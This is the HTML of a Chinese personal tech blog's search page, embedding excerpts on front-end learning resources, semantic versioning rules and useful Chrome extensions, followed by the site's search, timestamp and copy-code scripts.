&lt;p&gt;8、&lt;a href=&#34;http://www.worldhello.net/gotgit/&#34;&gt;蒋鑫-git权威指南&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​      &lt;a href=&#34;http://www.worldhello.net/gotgithub/&#34;&gt;蒋鑫-gotgithub&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;9、&lt;a href=&#34;https://www.jianshu.com/nb/49854893&#34;&gt;简书-繁华似锦Fighting&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;10、&lt;a href=&#34;https://git-scm.com/book/zh/v2&#34;&gt;git文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;11、&lt;a href=&#34;https://docs.github.com/en&#34;&gt;github文档&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;书籍：图解HTTP、HTTP权威指南&lt;/p&gt;
&lt;p&gt;1、&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/HTTP&#34;&gt;MDN-HTTP&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2、&lt;a href=&#34;https://juejin.cn/post/6844903844216832007&#34;&gt;图解HTTP整理-前端基础篇之HTTP协议&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3、&lt;a href=&#34;https://juejin.cn/post/6844903586703343624&#34;&gt;图解HTTP整理-来一场轰轰烈烈的HTTP协议扫盲革命&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;4、&lt;a href=&#34;https://www.runoob.com/http/http-tutorial.html&#34;&gt;菜鸟教程-HTTP&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​      &lt;a href=&#34;https://www.runoob.com/ajax/ajax-tutorial.html&#34;&gt;菜鸟教程-AJAX&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;5、&lt;a href=&#34;https://www.tutorialspoint.com/http/http_header_fields.htm&#34;&gt;http-tutorial&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​      &lt;a href=&#34;https://www.tutorialspoint.com/ajax/index.htm&#34;&gt;ajax-tutorial&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;nginx&#34;&gt;Nginx&lt;/h2&gt;
&lt;p&gt;1、&lt;a href=&#34;https://juejin.cn/post/6844903793918738440&#34;&gt;前端开发者必备的Nginx知识&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;javascript&#34;&gt;JavaScript&lt;/h2&gt;
&lt;p&gt;书籍：JavaScript高级程序设计&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/rwaldron/idiomatic.js&#34;&gt;JavaScript 编码原则-英文版&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/rwaldron/idiomatic.js/tree/master/translations/zh_CN&#34;&gt;JavaScript 编码原则-中文版&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://airbnb.io/javascript/&#34;&gt;JavaScript 规范指南&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/airbnb/javascript&#34;&gt;JavaScript 规范指南-英文版&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/lin-123/javascript&#34;&gt;JavaScript 规范指南-中文版&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/ryanmcdermott/clean-code-javascript&#34;&gt;JavaScript-代码整洁之道-英文版&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/alivebao/clean-code-js&#34;&gt;JavaScript-代码整洁之道-中文版&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;1、&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript&#34;&gt;MDN-JavaScript&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2、&lt;a href=&#34;https://zh.javascript.info/&#34;&gt;现代JavaScript教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3、&lt;a href=&#34;https://wangdoc.com/javascript/&#34;&gt;JavaScript 教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​      &lt;a href=&#34;https://javascript.ruanyifeng.com/&#34;&gt;JavaScript 标准参考教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;4、&lt;a href=&#34;http://bonsaiden.github.io/JavaScript-Garden/zh/&#34;&gt;JavaScript秘密花园&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;es6&#34;&gt;ES6+&lt;/h2&gt;
&lt;p&gt;1、&lt;a href=&#34;https://wangdoc.com/es6/&#34;&gt;ES6 入门教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​      &lt;a href=&#34;https://es6.ruanyifeng.com/&#34;&gt;ES6 入门教程&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;typescript&#34;&gt;TypeScript&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://ts.xcatliu.com/&#34;&gt;TypeScript 入门教程&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;css&#34;&gt;Css&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://cssguidelin.es/&#34;&gt;通用 CSS 笔记、建议与指导-英文版&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/chadluo/CSS-Guidelines/blob/master/README.md&#34;&gt;通用 CSS 笔记、建议与指导-中文版&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;1、&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/CSS&#34;&gt;MDN-CSS&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;algorithm&#34;&gt;algorithm&lt;/h2&gt;
&lt;p&gt;1、&lt;a href=&#34;https://visualgo.net/zh&#34;&gt;https://visualgo.net/zh&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2、&lt;a href=&#34;https://leetcode-cn.com/&#34;&gt;力扣&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3、&lt;a href=&#34;https://leetcode-solution-leetcode-pp.gitbook.io/leetcode-solution/&#34;&gt;力扣加加&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;4、&lt;a href=&#34;http://www.conardli.top/docs/&#34;&gt;awesome-coding-js&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;5、&lt;a href=&#34;https://programmercarl.com/&#34;&gt;代码随想录&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;6、&lt;a href=&#34;https://github.com/MisterBooo/LeetCodeAnimation&#34;&gt;动画版解题&lt;/a&gt;&lt;/p&gt;
">3-navigation-1-前端教程</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-yu-yi-hua-ban-ben/"" data-c="
          &lt;h2 id=&#34;版本格式&#34;&gt;版本格式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0.y.z&lt;/code&gt; 表示开发阶段，一切可能随时改变，非稳定版。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1.0.0&lt;/code&gt; 界定此版本为初始稳定版，后面的一切更新都基于此版本进行修改。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;版本格式：主版本号.次版本号.修订号&lt;br&gt;
版本示例：1.2.3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;版本号递增规则&#34;&gt;版本号递增规则&lt;/h2&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;主版本号：当你做了不兼容的 API 修改，&lt;/li&gt;
&lt;li&gt;次版本号：当你做了向下兼容的功能性新增，&lt;/li&gt;
&lt;li&gt;修订号：当你做了向下兼容的问题修正。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;先行版本号和开发版本号&#34;&gt;先行版本号和开发版本号&lt;/h2&gt;
&lt;p&gt;先行版本号(Pre-release)：意味该版本不稳定，可能存在兼容性问题。&lt;/p&gt;
&lt;p&gt;格式为: &lt;code&gt;X.Y.Z.[a-c][正整数]&lt;/code&gt;，如 1.0.0.a1，1.0.0.b99，1.0.0.c1000。&lt;/p&gt;
&lt;p&gt;开发版本号：常用于 CI-CD（持续集成和持续交付）&lt;/p&gt;
&lt;p&gt;格式为:  &lt;code&gt;X.Y.Z-dev[正整数]&lt;/code&gt;，如 1.0.1-dev4&lt;/p&gt;
&lt;h2 id=&#34;版本名称&#34;&gt;版本名称&lt;/h2&gt;
&lt;h3 id=&#34;常见&#34;&gt;常见&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;描述方式&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;α&lt;/code&gt;或&lt;code&gt;a&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;alpha 版&lt;/td&gt;
&lt;td&gt;内测版本，内部测试的版本，bug 较多&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;β&lt;/code&gt;或&lt;code&gt;b&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;beta 版&lt;/td&gt;
&lt;td&gt;公测版本，给外部进行测试的版本，有缺陷&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;γ&lt;/code&gt;或&lt;code&gt;g&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Gamma 版&lt;/td&gt;
&lt;td&gt;相当成熟的测试版，于发行版相差无几&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;rc&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Release Candidate&lt;/td&gt;
&lt;td&gt;是前面三种测试版的进一步版本，实现了全部功能，清除了大部分 bug，接近发布倒计时，有时会进一步细分为 rc1,rc2&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;其他&#34;&gt;其他&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;描述方式&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;Demo&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;演示版&lt;/td&gt;
&lt;td&gt;只集成了正式版部分功能，无法升级&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;SP&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;SP1&lt;/td&gt;
&lt;td&gt;是 service pack 的意思表示升级包&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;Trial&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;试用版&lt;/td&gt;
&lt;td&gt;试用版&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;Unregistered&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;未注册&lt;/td&gt;
&lt;td&gt;有功能或时间限制的版本&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;Lite&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;精简版&lt;/td&gt;
&lt;td&gt;只含有正式版核心功能&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;enhance&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;增强版&lt;/td&gt;
&lt;td&gt;属于正式版1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;free&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;免费版&lt;/td&gt;
&lt;td&gt;自由使用版本&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;release&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;发行版&lt;/td&gt;
&lt;td&gt;有时间限制&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;upgrade&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;升级版&lt;/td&gt;
&lt;td&gt;有功能增强或修复 bug&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;Retail&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;零售版&lt;/td&gt;
&lt;td&gt;单独发售&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;Cardware&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;共享版&lt;/td&gt;
&lt;td&gt;公用许可证&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;版本限定&#34;&gt;版本限定&lt;/h2&gt;
&lt;p&gt;在进行包管理时,为了保证安装依赖的兼容性.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
  &amp;quot;devDependencies&amp;quot;: {
    &amp;quot;karma&amp;quot;: &amp;quot;0.13.22&amp;quot;
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;表示安装 &lt;code&gt;0.13.22&lt;/code&gt; 版本的 karma.&lt;/p&gt;
&lt;h3 id=&#34;范围描述&#34;&gt;范围描述&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt; 小于某一版本号&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;=&lt;/code&gt; 小于等于某一版本号&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt; 大于某一版本号&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;=&lt;/code&gt; 大于等于某一版本号&lt;/li&gt;
&lt;li&gt;&lt;code&gt;=&lt;/code&gt; 等于某一版本号,没有意义和直接写该版本号一样&lt;/li&gt;
&lt;li&gt;&lt;code&gt;~&lt;/code&gt; 基于版本号描述的最新补丁版本&lt;/li&gt;
&lt;li&gt;&lt;code&gt;^&lt;/code&gt; 基于版本号描述的最新兼容版本&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-&lt;/code&gt; 某个范围&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;严格来讲对 &lt;code&gt;~,^&lt;/code&gt; 的表述需要结合具体的包管理工具和版本号规则来确定.但是对于一般使用记住如下原则.&lt;br&gt;
&lt;strong&gt;&lt;code&gt;^&lt;/code&gt; 是确保版本兼容性时,默认对次版本号的限定约束&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;&lt;code&gt;~&lt;/code&gt; 是确保版本兼容性时,默认对补丁号的约束&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;利用 &lt;code&gt;^,~&lt;/code&gt; 的意义在于确保工具包对依赖版本的兼容性,排除主版本更迭,&lt;br&gt;
造成依赖失效的可能.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;版本描述&#34;&gt;版本描述&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt; 通配符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;x,X&lt;/code&gt; 约等于 &lt;code&gt;*&lt;/code&gt; 号,通常用于次版本和补丁的通配.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;0.x&lt;/code&gt; 警惕这种版本,说明该依赖还未稳定(&lt;strong&gt;如果它遵守语义化命名的话&lt;/strong&gt;),此外由于 &lt;code&gt;0.x&lt;/code&gt; 版本随时可能改变,此时 &lt;code&gt;^,~&lt;/code&gt; 的都表示为对补丁版的限制.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;&amp;lt; 1.2.3     小于1.2.3 的版本均可 
= 1.2.3     只支持等于1.2.3 的版本 
&amp;lt;= 1.2.3    只支持小于等于1.2.3 的版本
&amp;gt; 1.2.3     只支持大于 1.2.3 的版本
&amp;gt;= 1.2.3    只支持大于等于 1.2.3 的版本
1.2.3-2     支持 &amp;gt;=1.2.3 &amp;lt;3.0.0 的版本
1.x.1       支持 &amp;gt;=1.0.1 &amp;lt;1.1.0 的版本
*           支持 &amp;gt;= 0.0.0 的版本
&amp;quot;&amp;quot;          同 *
1           表示 &amp;gt;=1.0.0 &amp;lt;2.0.0 其余任意位置为空相似
1.0         &amp;gt;= 1.0.0 &amp;lt; 1.1.0
~1.1.1      &amp;gt;=1.1.1 &amp;lt;1.2.0
~1.1        &amp;gt;=1.1.0 &amp;lt;1.2.0
~1          &amp;gt;=1.0.0 &amp;lt;2.0.0
^1.1.1      &amp;gt;=1.1.1 &amp;lt;2.0.0
^0.1.1      &amp;gt;=0.1.1 &amp;lt;0.2.0 注意这里,不要以为是 0.1.1-1.0.0 之间
^0.0.1      &amp;gt;=0.0.1 &amp;lt;0.0.2 同上,请注意
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;主要版本&#34;&gt;主要版本&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;指定版本：比如 &lt;code&gt;1.2.2&lt;/code&gt; ，遵循“大版本.次要版本.小版本”的格式规定，安装时只安装指定版本。&lt;/li&gt;
&lt;li&gt;波浪号（&lt;code&gt;tilde&lt;/code&gt;）+指定版本：比如 &lt;code&gt;~1.2.2&lt;/code&gt; ，表示安装 &lt;code&gt;1.2.x&lt;/code&gt; 的最新版本（不低于&lt;code&gt;1.2.2&lt;/code&gt;），但是不安装 &lt;code&gt;1.3.x&lt;/code&gt;，也就是说安装时不改变大版本号和次要版本号。&lt;/li&gt;
&lt;li&gt;插入号（&lt;code&gt;caret&lt;/code&gt;）+指定版本：比如 &lt;code&gt;ˆ1.2.2&lt;/code&gt;，表示安装 &lt;code&gt;1.x.x&lt;/code&gt; 的最新版本（不低于 &lt;code&gt;1.2.2&lt;/code&gt;），但是不安装 &lt;code&gt;2.x.x&lt;/code&gt;，也就是说安装时不改变大版本号。需要注意的是，如果大版本号为 0，则插入号的行为与波浪号相同，这是因为此时处于开发阶段，即使是次要版本号变动，也可能带来程序的不兼容。&lt;/li&gt;
&lt;li&gt;latest：安装最新版本。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文档&#34;&gt;文档&lt;/h2&gt;
&lt;p&gt;https://semver.org/lang/zh-CN/&lt;/p&gt;
&lt;p&gt;https://getcomposer.org/doc/articles/versions.md&lt;/p&gt;
">2-git-1-语义化版本</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/google-cha-jian/"" data-c="
          &lt;h2 id=&#34;1-bluesea&#34;&gt;1、BlueSea&lt;/h2&gt;
&lt;p&gt;GitHub 链接：https://github.com/jiangqizheng/BlueSea 。&lt;/p&gt;
&lt;p&gt;介绍：帮助翻译及记忆英语单词&lt;/p&gt;
&lt;h3 id=&#34;安装&#34;&gt;安装&lt;/h3&gt;
&lt;p&gt;1、下载或者克隆代码到本地&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clone https://github.com/jiangqizheng/BlueSea
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2.打开 Chrome 浏览器，在地址栏中输入chrome://extensions/，打开开发者模式，并选择加载已解压的扩展程序，选择 Bluesea 的代码文件夹。&lt;/p&gt;
&lt;h2 id=&#34;2-awesome-screenshot&#34;&gt;2、Awesome Screenshot&lt;/h2&gt;
&lt;p&gt;下载：谷歌商店搜索安装&lt;/p&gt;
&lt;p&gt;介绍：截图工具&lt;/p&gt;
&lt;p&gt;快捷键：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;可视区域： Ctrl + Shift + V&lt;/p&gt;
&lt;p&gt;选择区域:    Ctrl + Shift + S&lt;/p&gt;
&lt;p&gt;整个页面： Ctrl + Shift + E&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;3-adblock-plus&#34;&gt;3、Adblock Plus&lt;/h2&gt;
&lt;p&gt;下载：谷歌商店搜索安装&lt;/p&gt;
&lt;p&gt;介绍：广告拦截&lt;/p&gt;
&lt;h2 id=&#34;4-momentum&#34;&gt;4、Momentum&lt;/h2&gt;
&lt;p&gt;下载：谷歌商店搜索安装&lt;/p&gt;
&lt;p&gt;介绍：浏览器背景图片及小工具&lt;/p&gt;
&lt;h2 id=&#34;5-octotree&#34;&gt;5、octotree&lt;/h2&gt;
&lt;p&gt;下载：谷歌商店搜索安装&lt;/p&gt;
&lt;p&gt;介绍：将GitHub项目以目录树的方式展示，以便操作&lt;/p&gt;
&lt;h2 id=&#34;6-hostadmin-app&#34;&gt;6、HostAdmin App&lt;/h2&gt;
&lt;p&gt;下载：谷歌搜索HostAdmin App或访问下面连接&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://chrome.google.com/webstore/detail/hostadmin-app/mfoaclfeiefiehgaojbmncmefhdnikeg&#34;&gt;https://chrome.google.com/webstore/detail/hostadmin-app/mfoaclfeiefiehgaojbmncmefhdnikeg&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;介绍：管理Hosts，切换Host&lt;/p&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;p&gt;1、打开书签栏，点击应用，找到HostAdmin应用图标。&lt;/p&gt;
&lt;p&gt;2、第一次使用会让你选择hosts文件地址&lt;/p&gt;
&lt;p&gt;Editor -&amp;gt; Select Hosts File&lt;/p&gt;
&lt;p&gt;windows文件地址：C:\Windows\System32\drivers\etc\hosts&lt;/p&gt;
&lt;p&gt;3、在编辑器中编辑Host对应的IP，修改后按Save按钮保存&lt;/p&gt;
&lt;p&gt;比如将a.test.com域名指向127.0.0.1，访问的时候具体的端口号仍需加上a.test.com:8888&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;127.0.0.1 a.test.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;4、出现不能保存的问题&lt;/p&gt;
&lt;p&gt;给当前用户设置下Hosts文件的写入权限。&lt;/p&gt;
&lt;p&gt;以管理员身份运行cmd,回车执行以下命令&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;cacls %WINDIR%\system32\drivers\etc\hosts /E /G &amp;quot;%UserName%&amp;quot;:F
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;执行结果：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;处理的文件: C:\WINDOWS\system32\drivers\etc\hosts&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以管理员身份运行cmd：按下win键，输入cmd，以管理员身份运行命令提示符&lt;/p&gt;
">1-Chrome-1-插件</a>
      </div>
      
    </div>
    <div class="page">
      <div id="page_ul"></div>
    </div>
  </div>
</div>
<script>
  !function () {
    let searchMask = document.querySelector('#search_mask');
    let result = document.querySelector('#result');
    let items = document.querySelectorAll('.item');
    let searchBox = document.querySelector('#search');
    let statCount = document.querySelector('#stat_count');
    let statTimes = document.querySelector('#stat_times');
    let pageUl = document.querySelector('#page_ul');
    let close = document.querySelector('#close');
    
    close.addEventListener('click', function() {
      searchMask.style = 'display: none;'
    })

    let finds = [];
    let contents = [];
    let pageSize = 10;
    items.forEach(item => {
      let a = item.querySelector('a');
      contents.push({
        title: a.innerText,
        details: a.dataset.c,
        link: a.href
      })
      item.remove();
    })

    function insertStr(soure, start, count) {
      let newStr = soure.substr(start, count);
      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
    }

    pageUl.addEventListener('click', function(event) {
      let target = event.target;
      if (target.__proto__ === HTMLSpanElement.prototype) {
        appendResults(parseInt(target.dataset.i));
      }
    })

    function appendResults(index) {
      let htmlResult = '';
      let start = index || 0;
      let end = Math.min(start + pageSize, finds.length);
      for (let i = start; i < end; i++) {
        const current = finds[i];
        let html = current.title;
        let sum = 0;
        let positions = current.positions;
        positions.forEach(position => {
          html = insertStr(html, position.start + sum, position.count);
          sum += 9;
        })
        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
      }
      result.innerHTML = htmlResult;
      pageUl.innerHTML = '';
      let count = finds.length / pageSize;
      let lis = '';
      if (start !== 0) {
        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
      }
      for (let i = 0; i < count; i++) {
        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
      }
      if (start+1 < count) {
        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
      }
      pageUl.innerHTML = lis;
    }

    function search(delay) {
      let timer = null
      return function () {
        clearTimeout(timer)
        timer = setTimeout(() => {
          let start = Date.now();
          let segments = searchBox.value.split(' ').filter(c => c != '');
          if (segments.length <= 0) {
            return;
          }
          finds = [];
          let htmlResult = '';
          contents.forEach(content => {
            let title = content.title;
            let positions = [];
            let find = false;
            segments.forEach((segment) => {
              if (content.title.includes(segment)) {
                find = true;
                positions.push({
                  start: content.title.indexOf(segment),
                  count: segment.length
                })
              } else if (content.details.includes(segment)) {
                find = true;
              }
            });
            if (find) {
              finds.push({
                title: content.title,
                link: content.link,
                positions
              });
            }
          })
          appendResults(0);
          statCount.textContent = finds.length;
          statTimes.textContent = Date.now() - start;
        }, delay)
      }
    }
    searchBox.addEventListener('input', search(200));
  }()
</script>

<input hidden id="copy" />
<script>
  !function () {
    let times = document.querySelectorAll('.publish-time');
    for (let i = 0; i < times.length; i++) {
      let date = times[i].dataset.t;
      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
      if (time < 60) {
        str = time + '秒之前';
      } else if (time < 3600) {
        str = Math.floor(time / 60) + '分钟之前';
      } else if (time >= 3600 && time < 86400) {
        str = Math.floor(time / 3600) + '小时之前';
      } else if (time >= 86400 && time < 259200) {
        str = Math.floor(time / 86400) + '天之前';
      } else {
        str = times[i].textContent;
      }
      times[i].textContent = str;
    }
  }();
</script>

<script>
  let language = '';
  if (language !== '') {
    let map = new Map();
    if (language === 'en') {
      map.set('search', 'Search');
      map.set('category', 'Categories');
      map.set('article', 'Articles');
      map.set('tag', 'Tags');
      map.set('top', 'Top');
      map.set('publish', 'published');
      map.set('minute', ' minutes');
      map.set('read-more', 'Read More');
      map.set('view', 'View');
      map.set('words', ' words');
      map.set('category-in', 'category in');
      map.set('preview', 'Meta');
      map.set('index', 'Toc');
      map.set('no-archives', "You haven't created yet");
      map.set('archives', " articles in total");
      map.set('cloud-tags', " tags in total");
      map.set('copyright', "Copyright: ");
      map.set('author', "Author: ");
      map.set('link', "Link: ");
      map.set('leave-message', "Leave a message");
      map.set('format', "Links Format");
      map.set('site-name', "Name: ");
      map.set('site-link', "Link: ");
      map.set('site-desc', "Desc: ");
      map.set('stat', " related results, taking ");
      map.set('stat-time', " ms");
      map.set('site-img', "Image: ");
    }

    if (map.size > 0) {
      let lanElems = document.querySelectorAll('.language');
      lanElems.forEach(elem => {
        let lan = elem.dataset.lan, text = map.get(lan);
        if (elem.__proto__ === HTMLInputElement.prototype) {
          elem.placeholder = text
        } else {
          if (elem.dataset.count) {
            text = elem.dataset.count + text;
          }
          elem.textContent = text;
        }
      })
    }
  }
  //拿来主义(真香)^_^，Clipboard 实现摘自掘金 https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // 判断是不是ios端
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //创建文本元素
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //选择内容
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //复制到剪贴板
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("复制错误！请手动复制！")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === '复制成功') {
        return;
      }
      e.srcElement.textContent = '复制成功';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === '复制成功') {
            elem.textContent = '复制代码'
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = '复制代码';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })

</script>
<script src="/media/js/motion.js"></script>


<script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
<script>
  var scroll = new SmoothScroll('a[href*="#"]', {
    speed: 200
  });
</script>


<script src="/media/js/mouse/peace.js"></script>




</html>